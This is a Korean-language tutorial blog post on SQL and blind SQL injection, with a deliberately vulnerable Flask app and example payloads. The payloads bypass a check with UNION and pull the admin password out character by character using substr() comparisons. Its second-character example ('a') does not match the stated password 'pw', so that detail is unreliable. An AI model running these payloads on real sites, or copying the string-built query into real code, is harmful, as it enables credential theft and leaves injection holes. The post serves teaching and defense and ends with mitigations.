---
title: "[Infosec] SQL & Blind SQL Injection(sqli) 정리"
date: 2025-09-10 20:20:00 +0900
categories: [보안, Web]   # 카테고리는 여러 계층도 가능 [상위, 하위]
tags: [웹해킹, SQL, DBMS, SQLi, BlindSQLi]          # 해시태그처럼 글 묶기
description: "SQL의 허점을 이용해라"
author: "송지민"
toc: true
---
# 가장 치명적이고 오래된 웹 공격 수단

---
> 이 글은 **보안 학습/방어 목적**입니다. 실습은 반드시 **자신의 로컬/테스트 환경**에서만 하세요.

## DBMS란?

DBMS(Database Management System)는 데이터베이스를 관리하며 **CRUD(Create, Read, Update, Delete)** 기능을 제공하고, 다수의 사용자가 동시에 접근할 수 있도록 해준다.

| 종류 | 대표 DBMS |
| --- | --- |
| 관계형(Relational) | MySQL, MariaDB, PostgreSQL, SQLite |
| 비관계형(Non-Relational) | MongoDB, CouchDB, Redis |

- **관계형**: 행과 열(테이블, 스프레드시트와 유사) 구조  
- **비관계형**: 주로 Key-Value, 문서, 그래프 등의 구조

---

## SQL 명령어 구분

- **DDL (Data Definition Language)**: 데이터 정의어 (CREATE, DROP, ALTER …)  
- **DML (Data Manipulation Language)**: 데이터 조작어 (SELECT, INSERT, UPDATE, DELETE)  
- **DCL (Data Control Language)**: 데이터 제어어 (GRANT, REVOKE …)

### DML 기본 문법

- SELECT: 조회  
  ```sql
  SELECT 컬럼 FROM 테이블 WHERE 조건 ORDER BY 기준 LIMIT 갯수 OFFSET 시작위치;
  ```

- INSERT: 추가  
  ```sql
  INSERT INTO board (title, content) VALUES ('title 1', 'content 1');
  ```

- UPDATE: 수정  
  ```sql
  UPDATE users SET password='newpw' WHERE username='admin';
  ```

- DELETE: 삭제  
  ```sql
  DELETE FROM users WHERE username='guest';
  ```

---

## SQL 고급 기능

### UNION (합집합)
```sql
SELECT * FROM users
UNION
SELECT "DemoUser", "DemoPW";
```
조건:
1. 컬럼 개수가 동일해야 함  
2. 컬럼 타입이 동일해야 함  

### Subquery (서브쿼리)
쿼리 안에서 또 다른 쿼리를 사용하는 것.

```sql
SELECT 1,2,(SELECT 456);
```

### COLUMNS 절 서브쿼리
컬럼 절에서는 반드시 **단일 행, 단일 열**만 반환 가능.  
행이 여러 개거나 열이 여러 개면 오류 발생.

### FROM 절 서브쿼리 (Inline View)
다중 행/다중 열 모두 가능.

```sql
SELECT * FROM (SELECT username, 1234 FROM users) as u;
```

### WHERE 절 서브쿼리
다중 행 반환 가능.

```sql
SELECT * FROM users WHERE username IN (SELECT "admin" UNION SELECT "guest");
```

---

# Blind SQL Injection

**Blind SQLi**는 서버의 응답이 직접적으로 쿼리 결과를 보여주지 않고, **참/거짓 여부**만 알려줄 때 발생한다.  
공격자는 참/거짓 응답을 이용해 데이터베이스 내부 정보를 **추측하며 알아낸다.**

## 예시 코드 (Flask 서버)

```python
from flask import Flask, request
import pymysql

app = Flask(__name__)

def getConnection():
    return pymysql.connect(
        host='localhost',
        user='demo',
        password='demo',
        db='demo',
        charset='utf8'
    )

@app.route('/', methods=['GET'])
def index():
    username = request.args.get('username')
    sql = "select username from users where username='%s'" % username

    conn = getConnection()
    curs = conn.cursor(pymysql.cursors.DictCursor)
    curs.execute(sql)
    rows = curs.fetchall()
    conn.close()

    if rows and rows[0]['username'] == "admin":
        return "True"
    else:
        return "False"

app.run(host='0.0.0.0', port=8000)
```

### DB 가정 데이터

| username | password |
| --- | --- |
| admin | pw |
| guest | pw |

---

## Blind SQLi 공격 기법

### 1) UNION을 이용한 공격
```
// 요청
/?username=' union select 'admin' -- -
// 응답
True
```

### 2) 비교 구문을 이용한 공격
```
// 요청
/?username=' union select if(substr(password,1,1)='B','admin','not admin') from users where username='admin' -- -
// 응답
False

/?username=' union select if(substr(password,1,1)='P','admin','not admin') from users where username='admin' -- -
// 응답
True

/?username=' union select if(substr(password,2,1)='a','admin','not admin') from users where username='admin' -- -
// 응답
True
```

> 이런 식으로 한 글자씩 맞춰가며 비밀번호 값을 알아낼 수 있다.

---

## 방어 방법

1. **Prepared Statement (준비된 쿼리)**  
   - 파라미터 바인딩으로 문자열 결합을 차단  
2. **ORM 사용**  
   - Django ORM, SQLAlchemy 등 안전한 API 사용  
3. **최소 권한 원칙**  
   - DB 계정에 불필요한 권한 부여 금지  
4. **에러 숨김 처리**  
   - 상세 SQL 에러 대신 일반 메시지 반환  
5. **WAF(Web Application Firewall)**  
   - SQLi 탐지 및 차단 보조

---

## 요약

- **SQL**: 데이터 조작/정의/제어 언어  
- **UNION/Subquery**: SQL 기능 확장, 하지만 공격자에겐 공격 표면 확대  
- **Blind SQLi**: 결과 대신 참/거짓만으로 정보를 유출하는 공격  
- **방어 핵심**: **Prepared Statement + 최소 권한 + 에러 은폐**

